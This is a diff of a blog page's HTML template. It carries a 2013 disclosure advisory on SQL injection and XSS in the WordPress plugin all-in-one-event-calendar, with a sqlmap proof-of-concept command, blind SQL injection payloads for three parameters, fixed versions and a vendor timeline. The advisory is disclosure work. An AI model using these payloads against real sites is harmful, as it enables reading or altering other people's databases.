@@ -1,228 +1,332 @@
-<!doctype html>
-<html lang="en" prefix="og: http://ogp.me/ns#">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin</title>
-  <meta name="description"
-    content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
   
-  <meta name="author" content="Christian Mehlmauer">
+    <title>SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin :: firefart</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="During a recent security audit I found multiple vulnerabilities in the Wordpress plugin all-in-one-event-calendar" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://firefart.at/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/" />
 
-  <meta name="twitter:card" content="summary">
-  
-  <meta name="twitter:site" content="@firefart" />
-  <meta name="twitter:creator" content="@firefart" />
-  
-  <meta name="twitter:title" content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
-  <meta name="twitter:description"
-    content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
-  <meta property="og:title" content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="https://firefart.at/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/" />
-  <meta property="og:description"
-    content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
-  
-  <meta property="og:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
-  <meta name="twitter:image" content="https://www.gravatar.com/avatar/530ee2111e51f3d8379b1081d13bf345.png?s=400" />
-  
-  <meta property="og:updated_time" content="2013-11-14 22:05:00 &#43;0100 CET" />
-  <meta property="article:author" content="https://twitter.com/firefart" />
 
-  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
-    type="text/css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
-  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+
 
   
   
-  <script type="application/ld+json">
-    [{
-        "@context": "http://schema.org",
-        "@type": "WebSite",
-        "name": "firefart",
-        "url": "https://firefart.at"
-      },
-      {
-        "@context": "http://schema.org",
-        "@type": "Person",
-        "name": "Christian Mehlmauer",
-        "url": "https://firefart.at",
-        "sameAs": [
-          "https://twitter.com/firefart",
-          "https://github.com/firefart",
-          "https://www.linkedin.com/in/firefart/"
-        ]
-      }
-    ]
-  </script>
+  
+  
+  
+  <link rel="stylesheet" href="/style.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://firefart.at/img/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://firefart.at" />
+  
+    <meta name="twitter:creator" content="firefart" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin">
+<meta property="og:description" content="During a recent security audit I found multiple vulnerabilities in the Wordpress plugin all-in-one-event-calendar" />
+<meta property="og:url" content="https://firefart.at/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/" />
+<meta property="og:site_name" content="firefart" />
+
+  
+    <meta property="og:image" content="https://firefart.at/img/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2013-11-14 22:05:00 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src='https://firefart.at/js/firefart.js' defer></script>
+
+<script type="application/ld+json">
+  [{
+      "@context": "http://schema.org",
+      "@type": "WebSite",
+      "name": "firefart",
+      "url": "https://firefart.at"
+    },
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Christian Mehlmauer",
+      "url": "https://firefart.at",
+      "sameAs": [
+        "https://twitter.com/firefart",
+        "https://github.com/firefart",
+        "https://www.linkedin.com/in/firefart/"
+      ]
+    }
+  ]
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N88XDVDDZ7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-N88XDVDDZ7');
+</script>
+
+
 
 </head>
+<body class="blue">
 
-<body>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <h1 class="brand-title"><a href="/">firefart</a></h1>
-        <h2 class="brand-tagline"> that austrian security guy </h2>
+<div class="container center headings--one-size">
 
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://twitter.com/firefart">
-                        <i class="fa fa-twitter"></i> Twitter
-                    </a>
-                </li>
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://github.com/firefart">
-                        <i class="fa fa-github-alt"></i> Github
-                    </a>
-                </li>
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
-                </li>
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    firefart | that austrian security guy
+  </div>
+</a>
+
     </div>
-</div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu hidden-on-mobile">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/firefart">Github</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/firefart">Twitter</a></li>
+        
+      
+    
+  </ul>
+  <span class="spacer"></span>
+  <ul class="menu__inner menu__inner--desktop">
+    
+  </ul>
 
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
-            
-            <div class="posts">
-                <h1 class="content-subhead">14 Nov 2013, 22:05</h1>
-                <section class="post">
-                    <header class="post-header">
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/firefart">Github</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/firefart">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
 
-                        <a href="/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/" class="post-title">SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin</a>
+  
+</header>
 
-                        <p class="post-meta">
-                            
-                            
-                        </p>
-                    </header>
 
-                    
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://firefart.at/post/sql-injection-and-xss-in-all-in-one-event-calendar-wordpress-plugin/">SQL-Injection and XSS in All-in-one-event-calendar Wordpress Plugin</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2013-11-14 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Christian Mehlmauer</span>
+    
+    
+  </div>
 
-                    <div class="post-description">
-                        <p>During a recent security audit I found multiple vulnerabilities in the Wordpress plugin &ldquo;all-in-one-event-calendar&rdquo;.
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>During a recent security audit I found multiple vulnerabilities in the Wordpress plugin &ldquo;all-in-one-event-calendar&rdquo;.
 There is a lite version provided through the Wordpress site (<a href="http://wordpress.org/plugins/all-in-one-event-calendar/">http://wordpress.org/plugins/all-in-one-event-calendar/</a>), and a standard version provided through a third party site (<a href="http://time.ly/">http://time.ly/</a>).
 Both versions were tested and are vulnerable to the reported issues.</p>
 <p>PS: There is also a paid pro version. This was not tested but it&rsquo;s likely also vulnerable to the mentioned issues.</p>
-<p><strong>Tested versions:</strong></p>
+<h2 id="tested-versions">Tested versions<a href="#tested-versions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Lite Plugin: 1.9</p>
 <p>Standard Plugin: 1.10</p>
-<p><strong>SQL-Injection through export function</strong></p>
+<h2 id="sql-injection-through-export-function">SQL-Injection through export function<a href="#sql-injection-through-export-function" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>The plugin offers an export function to export the event to either iCal format or Google Calender.</p>
 <p>The Parameters &ldquo;ai1ec_cat_ids&rdquo;, &ldquo;ai1ec_post_ids&rdquo; and &ldquo;ai1ec_tag_ids&rdquo; are all vulnerable to SQL-Injection.
 By exploiting this vulnerability, a user is able to read or modify the whole Wordpress Database, or even more depending on the database configuration.</p>
-<p><strong>Vulnerable code:</strong></p>
+<h2 id="vulnerable-code">Vulnerable code<a href="#vulnerable-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p><a href="http://plugins.trac.wordpress.org/browser/all-in-one-event-calendar/tags/1.9/app/helper/class-ai1ec-calendar-helper.php#L1146">http://plugins.trac.wordpress.org/browser/all-in-one-event-calendar/tags/1.9/app/helper/class-ai1ec-calendar-helper.php#L1146</a></p>
-<p><strong>Proof of concept:</strong></p>
+<h2 id="proof-of-concept">Proof of concept<a href="#proof-of-concept" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>To exploit this SQL-Injection through sqlmap (<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>):
 Prerequisite: You need at least one event</p>
-<pre tabindex="0"><code>python sqlmap.py --url &#34;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&#34; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
-</code></pre><p><strong>sqlmap Output:</strong></p>
-<pre tabindex="0"><code>Place: GET
-Parameter: ai1ec_cat_ids
-Type: boolean-based blind
-Title: OR boolean-based blind - WHERE or HAVING clause
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=-8478) OR (5188=5188) AND (1391=1391&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=
-Type: AND/OR time-based blind
-Title: MySQL &amp;gt; 5.0.11 OR time-based blind
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=-2330) OR 3582=SLEEP(5) AND (8356=8356&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=
-
-Place: GET
-Parameter: ai1ec_post_ids
-Type: boolean-based blind
-Title: OR boolean-based blind - WHERE or HAVING clause
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=-8080) OR (8936=8936) AND (6501=6501
-Type: AND/OR time-based blind
-Title: MySQL &amp;gt; 5.0.11 OR time-based blind
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=-2544) OR 1170=SLEEP(5) AND (6134=6134
-
-Place: GET
-Parameter: ai1ec_tag_ids
-Type: boolean-based blind
-Title: OR boolean-based blind - WHERE or HAVING clause
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=-6274) OR (5133=5133) AND (6779=6779&amp;amp;ai1ec_post_ids=
-Type: AND/OR time-based blind
-Title: MySQL &amp;gt; 5.0.11 OR time-based blind
-Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=-1181) OR 8944=SLEEP(5) AND (4367=4367&amp;amp;ai1ec_post_ids=
-</code></pre><p>This proves, that all 3 Parameters are vulnerable to SQL-Injection. Due to some Parameter processing before the Statement is executed (e.g. split by comma), you need to write a script to exploit this vulnerability, or use a tool like sqlmap.</p>
-<p><strong>Cross Site Scripting (XSS) in location details:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>python sqlmap.py --url &#34;http://IP/wordpress/?plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=&#34; -p ai1ec_tag_ids,ai1ec_post_ids,ai1ec_cat_ids --risk 3 --level 3 --dbms mysql
+</span></span></code></pre></div><h2 id="sqlmap-output">sqlmap Output<a href="#sqlmap-output" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Place: GET
+</span></span><span style="display:flex;"><span>Parameter: ai1ec_cat_ids
+</span></span><span style="display:flex;"><span>Type: boolean-based blind
+</span></span><span style="display:flex;"><span>Title: OR boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=-8478) OR (5188=5188) AND (1391=1391&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=
+</span></span><span style="display:flex;"><span>Type: AND/OR time-based blind
+</span></span><span style="display:flex;"><span>Title: MySQL &amp;gt; 5.0.11 OR time-based blind
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=-2330) OR 3582=SLEEP(5) AND (8356=8356&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Place: GET
+</span></span><span style="display:flex;"><span>Parameter: ai1ec_post_ids
+</span></span><span style="display:flex;"><span>Type: boolean-based blind
+</span></span><span style="display:flex;"><span>Title: OR boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=-8080) OR (8936=8936) AND (6501=6501
+</span></span><span style="display:flex;"><span>Type: AND/OR time-based blind
+</span></span><span style="display:flex;"><span>Title: MySQL &amp;gt; 5.0.11 OR time-based blind
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=&amp;amp;ai1ec_post_ids=-2544) OR 1170=SLEEP(5) AND (6134=6134
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Place: GET
+</span></span><span style="display:flex;"><span>Parameter: ai1ec_tag_ids
+</span></span><span style="display:flex;"><span>Type: boolean-based blind
+</span></span><span style="display:flex;"><span>Title: OR boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=-6274) OR (5133=5133) AND (6779=6779&amp;amp;ai1ec_post_ids=
+</span></span><span style="display:flex;"><span>Type: AND/OR time-based blind
+</span></span><span style="display:flex;"><span>Title: MySQL &amp;gt; 5.0.11 OR time-based blind
+</span></span><span style="display:flex;"><span>Payload: plugin=all-in-one-event-calendar&amp;amp;controller=ai1ec_exporter_controller&amp;amp;action=export_events&amp;amp;cb=5032359096&amp;amp;ai1ec_cat_ids=&amp;amp;ai1ec_tag_ids=-1181) OR 8944=SLEEP(5) AND (4367=4367&amp;amp;ai1ec_post_ids=
+</span></span></code></pre></div><p>This proves, that all 3 Parameters are vulnerable to SQL-Injection. Due to some Parameter processing before the Statement is executed (e.g. split by comma), you need to write a script to exploit this vulnerability, or use a tool like sqlmap.</p>
+<h2 id="cross-site-scripting-xss-in-location-details">Cross Site Scripting (XSS) in location details<a href="#cross-site-scripting-xss-in-location-details" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>When entering Javascript code in the fields &ldquo;Venue Name&rdquo; and &ldquo;Address&rdquo; when creating a new event, it is possible to execute script code in the context of the user viewing the event.</p>
 <p>All values should be properly escaped before they are output to HTML. This issue is present through all default Calendar Themes.</p>
-<p><strong>All Issues were fixed in the following versions:</strong></p>
+<h2 id="all-issues-were-fixed-in-the-following-versions">All Issues were fixed in the following versions<a href="#all-issues-were-fixed-in-the-following-versions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p><em>Lite version:</em> 1.10</p>
 <p><em>Standard version:</em> 1.10.1-standard</p>
-<p><strong>Timeline:</strong></p>
+<h2 id="timeline">Timeline<a href="#timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>03.07.2013: Informed time.ly, secunia and wordpress about the vulnerabilities</p>
 <p>03.07.2013: Received mail from time.ly saying they forwarded it to their developers</p>
 <p>23.07.2013: Asked for an ETA because the issue is still present</p>
 <p>23.07.2013: time.ly submitted fixed plugin to wordpress repository</p>
 <p>24.07.2013: lite Plugin fixed (<a href="http://plugins.trac.wordpress.org/changeset/745755/all-in-one-event-calendar/tags/1.10">http://plugins.trac.wordpress.org/changeset/745755/all-in-one-event-calendar/tags/1.10</a>)</p>
 <p>03.10.2013: Standard Plugin fixed (<a href="http://time.ly/1-10-1-now-available-for-some-standard-users/">http://time.ly/1-10-1-now-available-for-some-standard-users/</a>)</p>
-<p><strong>Additional URLs:</strong>
-<em>Secunia Advisory:</em> <a href="http://secunia.com/advisories/54038/">http://secunia.com/advisories/54038/</a></p>
-                    </div>
-                </section>
-            </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
-        <ul>
-            <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/firefart/firefart.github.io">Github</a></li>
-        </ul>
+<h2 id="additional-urls">Additional URLs<a href="#additional-urls" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><em>Secunia Advisory:</em> <a href="http://secunia.com/advisories/54038/">http://secunia.com/advisories/54038/</a></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://firefart.at/post/multiple-vulnerabilities-in-ioncube-loader-wizard/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Multiple Vulnerabilities in ionCube Loader-wizard</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://firefart.at/post/analyzing-hp-thinpro-firmware/">
+                <span class="button__text">Analyzing HP Thinpro Firmware</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
     </div>
 </div>
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script type="text/javascript" src='https://firefart.at/js/firefart.js'></script>
 
-<script type="text/javascript">
-    var _paq = window._paq || [];
-     
-    _paq.push(["setCookieDomain", "*.firefart.at"]);
-    _paq.push(['trackPageView']);
-    _paq.push(['enableLinkTracking']);
-    (function () {
-        var u = "https://tracking.firefart.at/";
-        _paq.push(['setTrackerUrl', u + 'mat.php']);
-        _paq.push(['setSiteId', '1']);
-        var d = document,
-            g = d.createElement('script'),
-            s = d.getElementsByTagName('script')[0];
-        g.type = 'text/javascript';
-        g.async = true;
-        g.defer = true;
-        g.src = u + 'mat.js';
-        s.parentNode.insertBefore(g, s);
-    })();
-</script>
-<noscript>
-    <p><img src="https://tracking.firefart.at/mat.php?idsite=1&amp;rec=1" style="border:0;" alt="" /></p>
-</noscript>
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Copyright by Christian Mehlmauer</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
 
 
-        </div>
-    </div>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+  
 </div>
+
 </body>
-
 </html>
